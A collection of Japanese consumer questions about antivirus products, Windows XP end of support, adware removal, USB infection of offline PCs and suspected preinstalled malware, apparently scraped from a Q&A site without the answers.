初心者です。 うまく説明出来ないときも有りますか回答宜しくお願いいたします。 私はauのAndroidのWiMax携帯を使用しながらSIMカード無しのソフトバンクiPhone４をWi-Fi接続で使用したいと思っていますが、判らないのは、もし、万が一iPhoneの方がウィルス感染してしまった時、 auのAndroidに影響はないのではしょうか？ Gmailメールなどファイルの送受信しないつもりです。
教えていただけますか？ ウィルスソフト正規品（個人が提供する無料アプリなどではなく）お得に利用、購入できる方法はありますか？OSはWindows７です。 使用しているケーブルテレビ会社に聞いたところ、月350円でパソコンウィルスソフトを提供しているようです。携帯はauです。どこかと協賛していて無料や割引でインストールできるウィルスソフトなどありましたら教えていただければ幸いです。
会社の中に閉ざされたネットワークのパソコン群があります。 それらはインターネットといった外部のネットワークとは遮断されており、有線LANにて専用のプリンターと接続されています。 インターネットに接続されていないために、WindowsUPDATEは全く行われていません。 常駐のセキュリティソフトもインストールされていません。 OSはXPですが、インターネットに接続されていないので、会社では四月以降も継続して使用する予定です。 ClamWin portableでスキャンしてみたところトロイの木馬に感染していました。 感染したファイルの削除には成功しましたが、どこから感染したのでしょう。 これらのパソコンはUSBメモリを使って外部とデータ交換をしています。 閉ざされたネットワークですからトロイの木馬に感染していようとも、活動しようがないとも思います。 USBメモリからトロイの木馬は感染し、悪さをするものなのでしょうか。 、
初歩的な質問で恥ずかしいのですが、宜しくお願い致します。 私は、ＸＰででホームページを作っています。そのPCはホームページだけに使っていて、 メールやサイトを見たりはしておらず、インターネットに接続するのは、 plalaにデータを送る時だけです。 もう１台ウィンドーズ７のPCがありまして、普段はそちらのPCを使っています。 ＸＰのPCを購入した時に付いていたホームページninja2003のソフトは、そのＰＣのみでしか、使うことが出来なくて、仕方なく今も使っています。 ４月でＸＰのサポートが終了するそうですが、plalaにデータを送る時だけにインターネットに接続して 使っているＰＣは、ウィルスに感染する可能性はゼロと考えて良いのでしょうか。念の為に、光ケーブルのコードを抜いておいた方が良いのでしょうか。 ご回答宜しくお願い致します。
１．同じPCで、アカウントを遊び用と仕事用で分ける ２．仕事用アカウントのドキュメントはEFSを使ってファイルを暗号化する ３．Bitlocker to GoでUSBメモリを丸ごと暗号化して必要な時だけ仕事用アカウントでアクセスする ４．Truecryptでファイルや、またはパーティション丸ごと暗号化する。マウントは仕事用アカウントからだけ ５．BitlockerやTruecryptでシステムパーティション丸ごと暗号化する マルウェア対策として１２３４５のうちどれが有効でどれが無意味か、教えてください。 また、暗号化をマルウェア対策で使うとき12345以外でもっと安全、あるいは便利な方法があったらおしえてください。 よろしくおねがいします。
今回タブレットも使うのでタブレットにも使えるノートンセキュリティに買い換えようと思います。 現在ノートンインターネットセキュリティですがwithバックアップというものがあります。 よさそうですがどうなのかなと思いました。将来パソコンを買い換えた時に、今のパソコンのデータを新パソコンに移すことができるということです。メール、音楽、お気に入り。 ちなみにこれらはソフトがなくても自分できるんでしょうか？移動。 といいますか？あったら便利程度のものでしょうか？ついてるとかなり便利な代物でしょうか？ あったら便利程度なら格安のベーシック版でもいいかなと思ってるんですが。
誰かわからない人からアド変の連絡が来たのですが、友達の可能性もあるので返事をしようか迷っています。色々調べてみたら、返信画面にした時に出てくる向こうのアドレスがどうなっているかを見たら分かると書いてあったので、ためしてみたら@sweet10cn.comと出てきました。やはり、迷惑メール的なものなんでしょうか？
現在、自宅のパソコン（OS:Win7）にウイルスバスタークラウドを入れています（3年契約の2年目）。 4月から息子が大学進学のため一人暮らしをするにあたり、息子のPCを2台目にしようと思うのですが可能でしょうか？ 息子のPCは未だ購入してませんがOSはWin8を考えています。なお、借りたアパートはインターネット接続が無料で付いているので、プロバイダーは別になると思います。 仕送りをするのだから生計は同一といって良いのでしょうか？ 常識以前の質問かもしれませんがよろしくお願いいたします。
海外の評価機関 AV-comparatives などによると、評価が高いのは、 ESET Smart Security　：　ADVANCED＋ Kaspersky Internet Security　：　ADVANCED＋ スーパーセキュリティZERO　：　ADVANCED＋ ウイルスバスター 　：　ADVANCED （ADVANCED＋はこの評価機関の最高評価、ADVANCEDはそれに次ぐ評価） この当たりですね。 スーパーセキュリティZEROは、開発元と販売元が別会社なのが気になります。ソースネクストというのも気になります。驚速シリーズで痛い目見たので……。 Norton Internet Securityは最近このテストに不参加なので判断に苦しみます。 ソフトの能力、サポート体制、他のソフトとの相性などで起こる不具合等などを考慮して、現状のお勧めはありますか？ 個人的には、ESETもしくはKaspersky辺りかなと思っているのですが、詳しい方の意見を聞いてからにしようと思っています。
BitLockerはハードディスクを暗号化するソフトだそうですが、最近流行のマルウェアは銀行口座などを狙ったものが多いですよね。こういった場合、パスワードのキーボード入力を狙われたり、スクリーンキャプチャを記録されたりと、BitLockerなどではほとんど役に立たないように思うのですが、違うのでしょうか？ 以前の質問で、BitLockerを念押しで推奨する方が居たもので、ちょっと意味がわからずにいます。 BitLockerは、パソコンを盗難された時などに、ハードディスクの中身を読み取られないようにする為のものという認識ですが違うのでしょうか？
仮に、脆弱性「Ａ」を狙ったマルウェア「Ａ１」が存在するとします。 そして、うっかり、「Ａ１」に感染しているホームページを閲覧してしまいました。 パソコンα：脆弱性「Ａ」あり、ウイルス対策ソフト定義ファイル「Ａ１」あり パソコンβ：脆弱性「Ａ」修正パッチ対策済み、ウイルス対策ソフト未使用 パソコンαとパソコンβはそれぞれどうなりますか？　明快な根拠を持って教えてください。
XPパソコンを使用し続けて、その代わりにウイルスソフトを入れるというのは、どうなのでしょう。 市販のウイルスソフトを入れて、ダメなら、ソフトの意味がないに思います。 単に、ウインドウズ側が、ウイルス対策をしないというだけだし、そもそも、ウインドウズ側がきちんとしたウイルスサポートをしていたら、みんなウイルスソフトを入れる必要はないのに、入れているのですから、XPのサポートをやめるといったからといって、 そんなに騒がなくてもと、ふと思ったのですが、 どう思いますか。 素人なので、事情がよくわかっていないので、質問しました。 詳しい方、適切な回答お願いします。
PCやモバイルのセキュリティについて知識がなくどのように管理していけばいいのか知らないので教えてください。 PC １．WinXPをのせているものをそのまま使用していく場合、どのようなセキュリティソフトがおすすめですか。今まではWSEのみでしたが^^i　XP終了に伴いより狙われ易くなるという記事をみたのでそのことについてもおききしたいです。 ２．Win8.1搭載のもの購入しましたが備え付けのセキュリティでは足りない点ex.USBからの進入は防御しない等、おすすめのソフト等おききしたいです。 タブレット、スマフォ セキュリティどうされているか教えてください。数台まとめてセキュリティするソフトがあるようですが、各機種にはどのように導入するのでしょうか。 yogatablet８、nexus5があります。 機種にそなえつけのもの、無料のものでカバーできるものがあればいいですが、導入機の操作性や使い易さ、必要性によりコストかかってもいいと思ってます。IT詳しくないので導入や運用が単純で最低限必要なものを探しています。 よろしくお願いいたします。
カスペルスキーの３年版を３年ごとに買うとしても２．４～３万円/９年。 ずっと最強がカスペルスキーとは限らないので毎年一番性能の高いソフトを買うとして定番どころが年間約５０００円なので９年で４５０００円。 ９年で４５０００円。iPadやSurface2が買える金額です。ここで疑問があります。 ノーガードのiPadやSurface2(ARM)と、カスペルスキーやノートンレベルの高性能セキュリティソフトを入れたwindows8.1パソコンはどちらがより安全でしょうか？ iPadはかなり高いシェアを現状もっていて安全と言われていますから今後もそうであると考えていいでしょうか？ また、何か他に見落としていることがあったら教えてください。 よろしくおねがいします。
最新のwindows8.1をアップデートで最新の状態にして、同じく最新の更新をしたカスペルスキー2014で完全スキャンし何も発見されないとき、このPCはクリーンであると証明できますか？
パソコンのウイルスを防ぐためのソフトを購入しようと インターネットを見ましたがどの会社のものを 買ったらいいか迷います。どこがいいでしょうか？
まああ電話は有料でなかなか繋がらない。 チャットサポートは日本語ちんぷんかんぷん毛の生えた会話内容 メールサポートはガチ中国人のちんぷんかんぷん野郎 いったいこの会社は糞なんですか？ 10年以上付き合ってたけど、変更したいと思います。 日本人がサポートしてくれる会社はないでしょうか？ 何日たっても会話がかみ合わない！0120引いてるような会社ないですか？
初歩的な質問で恐縮です。 混乱してしまい、わかりにくい質問かもしれませんが、アドバイスをお願いします。 BTOでのPCの新規購入を考えていまして、某メーカーのソフト体験版がインストールされてるようです。 ただ、別メーカーのソフト（ダウンロード版）の購入を決めていまして、本来なら体験版を使う必要はないのです。 しかし、別メーカーのセキュリティソフトのダウンロード版を購入してインストール予定ですから、そのソフトを購入する際は、ネット接続することになりますよね？ そうなると当然無防備状態ですが、やはり他社ソフトの体験版で防御しておいた上で、上記ソフトをダウンロードしてから、体験版をアンインストールするべきなのか？ あるいは体験版の削除は後で良いものですか？ 先に体験版を削除してしまいますと、ソフトをインストールする際にはネット接続をすると思いますので、わずかな間、無防備になると思われますが、そんな事はありませんか？ そう考えますと、後で削除かな？と思ったりもしますが、２種類のソフトをインストールしてはいけないと聞いた事があり、そのあたりが混乱してよくわかりません・・。 それとも、PC購入時に付いている体験版を削除して、購入予定の３０日体験版をインストールして、１か月後に、ダウンロード版を購入するのが妥当でしょうか？ アドバイスお願いします。
http://www.higaitaisaku.com/ へ行ったつもりが、カジノのような金儲けのような宣伝のサイトに行ってしまいます。 閉鎖したのではなく、こっちのパソコンにウイルスでしょうか。 OSは7　ESETsmartＳＥＣＵＲＩＴＹ使用です。　
　 動画データ再生中にウィルスに感染することは有り得ますか。 　
パソコン初心者です。Vistaです。 Microsoft Security Essentは確実 にインストールされています。 ただし、右下メニューバーの中に これまであった。Microsoft Security Essentのアイコンがなくなってしまい ました。 復旧方法を教えてください。
　昨日あたりからOS起動後、セキュリティソフトのアイコンがタスクバーに見えなかった為確認したところ、スタートアップ時に自動起動設定に入っていたのに起動しなくなっていました。 　直接C:\ProgramFiles\MicrosoftSeculityClient\msseces.exeを実行させると「ソフトウェアの制限ポリシーによってこのプログラムを開くことが出来ないようになっています。詳細はイベントビューアを開くかシステム管理者に問い合わせてください」と出てしまいます。 　タスクマネージャでSYSTEMでMsMpEng.exeが動いているのに、どうなってしまったのでしょうか？ 　できれば元に戻したいと思います。助言お願いします。 OS：WindowsXP HomeEdition SP3
現在、インターネットのセキュリティソフトをノートン（PCの購入と同時に３年間）を使っており、 来月に有効期限が切れます。 そこで、新しいセキュリティソフトの購入を検討しているのですが、PCの知識が乏しいので、 私のネットの使用状況に適したセキュリティソフトのアドバイスをお願いいたします。 PCのOSはWindows　7、メモリは４GBで、主に自宅にてフレッツ光で有線ケーブルを使っております。 ネットの使用頻度は週に１、２回程度で、主に調べたい事柄についての情報を各サイトにて。 ブラウザは大体がGoogle Chrome　（Internet Explorerは表示が遅いので極たまに）　です。 ネット通販を月１、２回程度。主にAmazon、時々、楽天にて購入。 mailは週１回程度、yahooページ上にてログインしてチェックしております。 以上、情報不足、拙い文章にて申し訳ありませんがよろしくお願いいたします。
DELL INSPIRON 1100 Windows XP 新しいウィルスソフトを入れようとして ウィルスセキュリティを削除しようとしますが 削除できません プログラムの追加と削除から試みますが失敗します メッセージは次のようなものです Failed to extrct file "Dll ini"from the binary table
韓国の“サイバーテロ”に使用されたマルウェア、セキュリティ各社が分析 internet.watch.impress.co.jp/docs/news/20130321_592671.html 「ドロッパーは、「AgentBase.exe」という名前でMBRを不能にするモジュールを %TEMP%フォルダーにダウンロードし、実行させる。」 あきらかに クソ怪しいファイル名と Tempにファイルを落とされて 本当に気づかなかったのか？ おそらく これプロセスにも出てたんじゃないのかな 名前が。 やはり 「韓国の2社（AhnLabとHauri）のウイルス対策製品を作動不能にしようと試みる。」 これが原因で セキュリティが半分 止まっていたとか？ ごく 当たり前な言葉では ウイルス対策をしましょう とか 言われるけど このように セキュリティ自体が 停止させられたり あるいは 機能してるように見えて 実際は ウイルスを 許可していたりした場合には かえって ウイルス感染に 気づくのが遅れる場合はないのか？ という点も 気になる。 サイトを運営してる人のブログで サイト改ざんにより ウイルス被害が出たという話があり その人の場合も 使用している セキュリティが見つけられなかった。 確実に見つけられるものなんてないことは分かるけど その人は サポートも受けて相談したにもかかわらず 「あなたのＰＣ（サーバ？）に ウイルスはありません」 っと言われたそうですｗ これが原因で 逆にウイルスの存在に 気づくのが遅れたという話ですね。 「新種だったから」 なんていうのは 言い訳にしか聞こえない。 感染している そのときに 「ソレは 実際に 動いてる」 わけだから。 大規模に感染して 全てが 無体策だったなんてありえないし それなら 対策ソフトという セキュリティ とやらは 何をしてたんだ？ という疑問なんだけど このような ウイルスで その存在に気づけない理由や どのようにしたら 気づきやすいか？ 等の 意見を求めます。
まず素朴な疑問として、admin権限のもとコンピュータ内部のあらゆる情報を調べるセキュリティソフトは安全と言えるのでしょうか。 ウィルスソフトがセキュリティソフトの面を被ってPC内に入り込み、PC内部情報をウィルスソフトの本部へ垂れ流すなどの悪さをすることはないのでしょうか。 　
こんにちは。よろしくお願いします。 インターネットに接続しないパソコンがあります。 （３台／ホスト機一台・端末機２台） しかし、USBメモリを繋いだときに、 メモリから、ウィルス感染する可能性が考えられます。 ウィルスソフトを入れても、ウィルスの定義ファイル更新が問題です。 定義ファイルを手動で更新する方法なんですが、 他のPCで、 定義ファイル更新（もしくはファイルをダウンロードするだけ） → USBメモリにコピー → インターネット接続していないPCにメモリを挿す → データベース更新。 と言う様なことを考えますが、 そういう事が出来るソフトをご存じなら教えてください。 出来たら、ウィルスソフトは、接続していないパソコンだけに入れて、 （３台分のライセンス料は支払います） データベース更新できる方法と言いますか、そういう事が、 簡便に出来るソフトがあれば、教えてください。
マルウェア対策を積極的にされている方に質問です。 どのような対策をされていますか？ 詳しく教えてください。
3か月前くらいからパソコンがアドウェアに感染してしまいました。 削除ツールをいくつか試してみましたが、駆除することができません。 タイプとしては以下の2つがあります。 (1)ブラウザの左下にflashで出て、広告はランダム。 (2)ブラウザの右下に、検索ワードに連動して、「最高＋検索ワード」というポップアップが出ます。遷移先は毎回FLVプレイヤーのダウンロードページ。 最新のツールで有効と思われるようなものがあれば、教えていただけますでしょうか。 宜しくお願いします。
ヤフーでインターネットをやっています。 今日、ヤフー画面を開いたら下の方に宣伝バーのようなものがまとわりついてました。 宣伝バーの横に×ボタンがあり押すと消えますがネット検索するとまた、まとわりつきます。 「てんこもり台湾１０都市周遊旅行」「億万長者になる秘密」・・・など、絶対開きませんが。 凄く目障りですが、迷惑メール対策ソフトの導入をした時にスパイウェアのようなものが 一緒にくっついて来たと思いますが、スパイウェアのようなアイコンだったので直ぐ削除しました。 しかしこのひつこい宣伝バーは困ります。 質問です。 ●ヤフー画面にまとわりつく宣伝バーを消去したいのですがどうすれば良いでしょうか？ よろしくお願いいたします。
買い換えて不要になったwindowsXP搭載パソコンをモンスターチャンネルというインターネットラジオの様なものを聞く専用に使いたいのですが、4月以降ウイルスに感染しても、見られて困るものを消去していればこの様な使い方は問題ありませんか？ それともウイルスに感染すればネットの回線から他のパソコンにも影響を及ぼすのでしょうか？ 因みにネット回線は無線（wifi）と有線（LANケーブル）両方使っており同じ環境に多数のPC利用者がいます。
先日、使っていないパソコンをメンテナンスで近くのPCDEPOへ持って行ったところ、このパソコンには大量の詐欺ソフトなるものがインストールされていると言われました。この不具合を取り除くには初期化が一番いい方法で、そのパソコンは使っていないので初期化をお願いしました。 しかし、現在メインで使っているパソコンがそれらの詐欺ソフトたるものに感染していないか不安になり、サイトで情報を見てみましたが、よさそうな検出ソフトがありませんでした。 詐欺ソフト等の悪質なものがパソコンにインストールされいないか調べる方法を教えてください。 宜しくお願いします。
今販売しているウイルスバスターはWinXP,WinVaster,Win7,Win8のいずれにも対応していると思います。 ところで、これをWinXPのパソコンに導入して、さらに今年４月以降もこのパソコンを使い続けたとした場合、このウイルスバスターはどういう挙動をするのでしょうか。つまり、それなりに役に立つのでしょうか。
Qone8というスパイウエアを削除したいのですがプログラムの追加と削除に見当たりません。どうしたらいいですか？FLVTOというYOUTUBEダウンローダーをインストールしてから出始めました。
avastのウィルススキャンを実行したところ、 Win32:Dropper-gen[Drp] 危険度 高 というウィルスが検出されました。知らないうちに感染してしまい、非常に動揺しております。しばらくウィルススキャンをしておらず、どれほど前から感染していたかもわかりません。現在は、avastの指示に従い、駆除をしたのち、再度スキャンをして異常なしであることを確認しております。 1.ウィルスを駆除するのに、ほかに必要な動作はあるか 2.すでに被害が出ているとしたらどんなものが考えられるか 3.そもそもこれはどのようなウィルスなのか 4.皆さんからみての危険度はどれくらいか（危険度 高 ということは、やはりとても危険なものなのでしょうか？） ということが引っかかっているので、ご回答よろしくおねがいします。
研究しながらアンインストールはしたのですが、Uniblueの広告が消えません。 消し方が分かる方、どうか、教えて下さい。 こういうことがあまり詳しくないもので、出来れば具体的にどうか、教えて下さい。 よろしくお願いいたします。
ウインドーズＸＰ対策として７を入手しましたが、ウインドーズオフィス２００３搭載でした。２００３も駄目だと最近知りあわてています。ワードは、メール添付したり、ＵＳＢメモリーで他人とやり取りしたりするのですが、その場合ワードだけ、キングソフトで出ている互換ソフトを使用するということに替えれば大丈夫と言えるのでしょうか？
Windows　Vistaです。 誤ってUniblueをインストールしてしまいました。 購入はしなかったです。 インストールしたデータは削除したのですが、宣伝広告が消えません。 時折、計測表示が出て来てうっとうしいです。 どうもパワフルスキャンをやるといいと思うのですが、方法が分かりません。 どうか、教えて下さい。 よろしくお願いいたします。
PCがウイルスだらけで、通信速度が遅く、ポップアップばかりなので初期化をしたいです。 ウイルスのタイプは、ブラウザーを開いている最中、突然別ウィンドウでJAVAの広告やらビデオプレイヤーの広告やらが出てくるというものです。ウイルス対策ソフトは無料のものしか使っていなかったため、最近になってやっとノートンの無料体験版を試用しています。 今までは、無料のウイルス対策ソフトだけでも、ほとんどウイルスに侵されなかったのに、アメリカに来た途端、ウイルスだらけになってしまいました。 できればデータを消したくないので、初期化は避けたいのですが、何かウイルスを消すいい方法はありませんか？ ちなみにあと三か月ほどで帰国する予定なので、それまでしのぐ方法でも構いません。 また、その場合、データをほかのPCに移したときにそのPCにウイルスまで移ってしまうという可能性はあるのでしょうか？
至急お願いします。 きょうメールをクリックしたところ、アダルトサイトにつながってしまい、自動的に入会したことになってしまいました。 このためパソコン画面に常時、変な写真が出たままになってします。 なんでも規約で９６００円を支払えば画面は自動的に消えるという文言が書いてあり、住所・名前を返信しろと出ています。 住所・名前等を返信すると相手にいいなりになるので、すぐに画面を消す方法はありませんか？ 大至急お願いします。
デスクトップ上のウィルスバスターのアイコンをクリックしても、右クリックして「開く」を操作してもウィルスバスターがはじまりません。 今までそうゆうことなかったんですが、先ほどいつもどおりやろうとしたら動かないです。 原因とかご存知のかたいらっしゃいますでしょうか？ よろしくお願いします
最近PCを放置していると 気づいたとき勝手にchromeのタブが増えていて 「お使いのPCは危険な状態です」などと書いてあるサイトに飛ばされます いろいろ問題のソフトダウンロードしてしまったので（Baidu、hao123など） ウイルスだとは思いますが「常時安全セキュリティー２４」では 検知されませんでした。←もちろん最新の状態です 動作が重くなったりはしてませんが、もし遠隔操作ウイルスとかだったら嫌なので 詳しい方どうすれば良いか教えてください。 ちなみにhao123はアンインストールできないように細工されていました(つд⊂)
Windows8.1を使っているのですが、先日「2個の重要なメッセージ」というものがWindowsアクションセンターから通知されました。それによると、Windows Defenderが有効になっていないとのことで、さっそく有効にしようとして「有効にする」ボタンをクリックしたのですが、そうすると勝手にWindowsのプログラムファイル一覧が開きます。 開いたプログラムファイル(system32っていうところが開いているみたいです)の画像を添付しましたが、ここからどうしたらいいのでしょうか?何か選ぶべきフォルダとファイルなどがあるのでしょうか? いかんせんパソコンなどにあまり強くないので、本当にわからないです。よろしくお願いします。
４０歳女性です。 この度Windows　ＸＰのサービス提供の中止に伴い新しくパソコンを買い換えまして、ついでにプロバイダーさんも買えることにしました。新しいプロバイダーさんの方で無料のインターネットセキュリティが付いていますので今まで使っていた「ノートンインターネットセキュリティ」を解約したいと思っています。 ノートンインターネットセキュリティは１年毎の自動更新で昨年１２月に自動更新したばかりです。更新したばかりですのでもったいないから解約したいので日割りでも返金してもらえたらなと思うのと、次回（今年の１２月）に自動更新にならないように今の内にサービス停止をしようと思いシマンテックストアから停止処置をしようと思い昨年１２月の注文ＮＯとメールアドレスを入力したのですが注文内容の確認しか出来ず、解約及びサービス停止に行くことができません。 このままですと新しいプロバイダーさんに切り替えるとメールアドレスも切り替わるため今年の１２月の自動更新からノートンのお知らせメールも来なくなるのでサービス停止処置も出来ず永遠に支払い続けることになるのではと不安に思っています。 一番スムーズに今年の１２月から自動更新せずサービスを止める事が出来る方法を御存知の方がいらっしゃいましたら教えて下さい。これは半ばあきらめているのですが中途解約で残日数分の返金をしてもらうことは出来るのでしょうか？昨年１２月の自動更新の分はクレジットカードで引き落とされ済みです。 一番良い方法を宜しく御願い申し上げます。
すいません。すごく困っていますので助けてください。 何かの無料ソフト経由でアドウェア広告が入り込んでしまってクロームに広告が出て消す事ができません。サイトなどを見ながら色々なソフトを試していたのですが症状が悪化しました。 最初は superantispyware というソフトを使ったのですが、200個近いアドウェアウィルスがヒットするものの削除しても、広告は無くなりませんでした。（もう一度スキャンするとまた200個近くヒットするのですが何回消しても まったくウィルスも消えません、本当に増えているような感じです） 次に Advanced SystemCare というソフトを使ったのですがスキャンするとヒットするものの削除してもアドウェア広告は消えません。 最後に以下のソフトを使ったのですが、これが最悪の糞ソフトでした。 Lavasoft Ad-Aware Free Antivirus+ まず使ってもアドウェア広告は消えませんし、クロームの検索結果画面がLavasoftに乗っ取られました。 インストールする際に確かに「Lavasoftを検索サイトに設定する」みたいな文言が出ましたので 「いいえ」にしたのですが結果、グーグルの検索結果の左には大きくLavasoftと出ていますし検索結果画面もいつもの違います。（アドレスバーに直接文字を打つと検索できると思いますが これがLavasoftになっています） 結局どちらを選んでもLavasoftに乗っ取られるのですね・・。 これを戻したいのですが戻し方が分かりませんし、ググっても出てきません。 アドウェアを消したいためにAd-Aware Free Antivirus+というソフトを使ったのに結果ウィルスの ようなソフトでした。窓の杜にあったフリーソフトなので安心して入れましたが・・・どうしてこんな ゴミソフトを紹介するのでしょうか・・。窓の杜にとってもマイナスだと思うのですが・・。 長くなりましたが、まずLavasoftに乗っ取られたブラウザを元に戻したいのと、アドウェアの広告が 多すぎて既にクロームが使えない状況です。 無料ソフトも全て試しましたのでこのあとどうすれば解決できるのか分かりません。 有料ソフトでも結構ですのでこの2つを解決できる方法ご存知のならアドバイス頂けませんか？ あとここを見ている人はLavasoftという会社のソフトは絶対使わない方がいいです。やり方が 汚すぎですし、こんな糞企業が作る糞ソフトが有益なわけがありません。注意してください。
ウィルス対策としてavastを使っています。 私はよく「にほんブログ村」の釣りのブログを見るのですが 今日も釣りのブログを見ようとしたら「有害なサイト又はファイルをブロックしました」と出てきました。 昨日は何ともなかったのですが・・・ avast使っている方、「にほんブログ村」を開いたらavastが反応しますか？ 私のｐｃだけでしょうか、気になります。 どうしたら出なくなるのでしょうか？
最近、パソコンを点けると 黒い画面に白文字で 数字 英語ではない文字 registry\machine\schema\wcm: といったような表示がたくさん出てきます。 普通に起動はするのですが、ウイルスでしょうか？ TOSHIBAのdynabook T451/34EWK Windows7を使っております。
ウイルスによって勝手に無線接続されるという現象が起こっています。 ドライバをアンインストールすれば、すでにウイルスに感染したパソコンは勝手に接続されることはないでしょうか？ ウイルスがワイヤレスのドライバまでそなえていることはありますか？ 接続されていないのにパソコンが勝手に動き出す現象が起こりました。 教えてください。お願いします。
ルータを使って2台のWindows 7でLANを組んでいます。 1カ月ほど前から差出人に心当たりのないメールが頻繁に来るようになりました。半分くらいは添付ファイルも付いています。 ウイルスが怖いので開かないで全部すぐ削除しています。ウイルススキャンした結果ではウイルスは発見されていないし自覚症状もないのですが、感染していないかどうか不安です。 もしウイルスに感染していたら、メールアドレスを変更してOS再インストールしてもすぐまた感染するでしょうか。 例えば、上記のメールの送信者が私のパソコンにウイルスを仕込んでいたとして、そのウイルスがパソコンとルータのMACアドレスを盗んだ場合、そのMACアドレスを使ってOS再インストール後の私のパソコンにウイルスを送り込んでくるということは可能でしょうか。 上記は1つの思いつきですが、ウイルスの専門家から見たらほかにも方法があるかも知れません。 メールアドレスを変更してOSを再インストールしても、それまでに感染させられていたハッカーからすぐまた感染させられるということがあるでしょうか。
youtubeで、例えば「東京」という言葉を検索バーに入力して虫眼鏡ボタンをクリックすると、ヒットした動画の一覧が縦一列に表示されます。 この中の例えば上から1番目の動画を再生して、次に上から2番目の動画を再生すると、上から1番目の動画が再生されます。何番目の動画を再生しても、最初に再生した動画（上から1番目の動画）が再生されます。 1週間ほど前からこの症状が出ています。 なぜでしょうか。 ウイルスが心配なのですがその可能性もあるでしょうか。 Windows 7、Internet Explorer 10です。
PS3でPCの動画を視聴(DLNA)しているのですが、【AVGインターネットセキュリティー2014】を入れたところ、ファイアウォールが邪魔をしてメディアサーバーが表示されなくなりました(ファイアウォールを無効にすると表示されます)。 アプリケーションの「追加」で「windows Media player」フォルダ内のアプリケーションをすべて「許可」にしても変化が無く、「ログ」を見ると、アプリケーションの「SYSTEM」が「Block」となっているのですが、どうすればそのアプリを「許可」にできるのかさっぱり分からず困っています。 一体、どうすれば改善されるのでしょうか？ ご存知の方がおられましたら、お教え頂ければ幸いです。 ※PCはlenovo G570です。 ※接続は以下の通りです。 　 　　wi-fiルーター(MobileSlim)----(無線)----PC-(有線)--PS3욿
http://oshiete.goo.ne.jp/qa/8480895.html どうも仮想環境上のLinuxの方だけ通信を許可することが可能なようなのです。 ですがLinux経験はたぶん3ぐらいのバージョンのKnoppixや8ぐらいの時代にUbuntuを使ったのが最後で最近の動向が分かりません。 Linux mintというのがブームなようですが、使い勝手はどんなもんでしょうか。検索して情報を集めてますが、PCに直接インストールする場合は大きな問題もないように見えます。でも仮想環境上だとどんな感じでしょうか。 PCに直接インストールでなく、仮想環境上（VMWAREPLAYERかVIRTUALBOX）に入れて使うとき最適なLinuxは何だと思いますか。
この クッダライ 質問は なんだと思いますか？ detail.chiebukuro.yahoo.co.jp/qa/question_detail/q11121314946 detail.chiebukuro.yahoo.co.jp/qa/question_detail/q12121332582 そんなに気になるなら てめえ で開けって話ですよねｗ 面白いから データ保存しといたｗ すまんが Ａｄｂｌｏｃk をわざと無効化してるために 表示されてる 怪しい 広告のが 怖くて とても気になって 開いちまったけど 残念ながら 「接続できません」 以上ですｗ この質問者に マトモなメールを装って ウイルス送ったら かなりの確立で ひっかかると 思いますが。。。ｗ どう 皆さん どう思いますか？ｗ くだらなさすぎて すぐに回答 にしておきましたｗ
よろしくお願いします。 最近の話ですが、NECのノートPCを２月１４日に購入しました。 購入して、開封を済ませたあとに分かったことなのですが、現在のNECは、 中国のPCメーカー「レノボ」と業務提携をしていることです。 http://www.nec.co.jp/press/ja/1107/0401.html http://blog.phooen.com/blog-entry-49.html 一昨年の秋にマイクロソフト社の調査で、中国のPCには、出荷時にあ らかじめPCの中にウイルスがが組み込まれているとのことです。 そのことに関連して検索した結果、下記の記事もありました。 ここから記事内容 ～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～ マイクロソフトが発見！　中国製パソコンに出荷時からウィルス　2012年9月16日 01:00　 工場で不正ソフトをインストール 米パソコンソフト大手マイクロソフト社は、中国製パソコンについて、製造時に工場で ウィルスなどのマルウェアがプリインストールされていることをつきとめた。 マルウェアの中には、ネット銀行のアカウントなどを抜き取るものもあった。 2割に出荷時からマルウェアマイクロソフト社では、中国のマルウェアを調査 するため「オペレーションb70」と名付けた調査活動をおこなってきた。 その一環として、中国のさまざまな都市でデスクトップパソコン10台、ノートパ ソコン10台を購入して調べたところ、このうち4台からウィルス感染が見つかった。 感染が確認された中国メーカーは複数に及ぶ。 ビデオカメラも遠隔操作工場でプリインストールされていたのは、Nitolと呼ばれ るマルウェアなど。 パソコンの電源が入れられるとすぐにコントロールシステムに接続し、さ まざまな情報取得や漏洩をおこなうもの。 ビデオカメラやマイクロフォンを遠隔操作する機能や、ユーザーのキーボード 操作を追跡するキーロガー機能、サイバー攻撃を隠す機能なども持つという。 一般にウィルスなどのマルウェアはネット経由で感染、侵入するものと考えられ てきた。出荷時からプリインストールされているとしたら、ファイアーウォールなど も無意味である。 中国製のパソコンや情報端末の購入には、慎重になったほうがいいようだ。 http://www.techweekeurope.co.uk/news/nitol-botne … ここまで .～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～ その他のサイト http://lifereproduction.hatenablog.com/entry/201 … PCのウイルスに関しでの知識は、あくまでも、素人です。 外から侵入してくるウイルスを防御するのには通常有効なウイルスソフトを利用 していればそこそこ、防止出来るかと思うのですが、仮に、PCメーカーの方で、 出荷時にあらかじめ組込まれた場合に、セキュリティソフトはどこまで有効に作動 するのでしょうか。 PCにあらかじめ組み込まれているとすれば、従来のセキュリティリティソフトはど の程度有効なのでしょうか。 同時にそのPC今後安全に使うための方法はあるのでしょうか。 今回購入したNECのPCに、ウイルスが組み込まれているとの各章は何もな いのですが、マイクロソフトのニュースとか、「尖閣列島の問題とか」、なんで も有りお国の政府資本も30％ぐらい入っているレノボが、大きく関係している 今のNECですので、そのあたりが非常に心配です。 　　　　よろしくお願いします
TrendMicro Softwareのアンインストールについて 先程、ESET NOD32アンチウイルスをインストールしようと思ったら、 TrendMicro Software（競合する可能性のあるソフトウェア）が見つかり、インストールを続行することができないと表示されました そこでコントロールパネルからアンインストールしようとしたのですが、名前と発行元を見てもTrendMicro Softwareが見つかりません パソコン初心者で本当に何もわからないので、詳しい方がいれば教えて下さい ちなみにパソコンはWindows7です
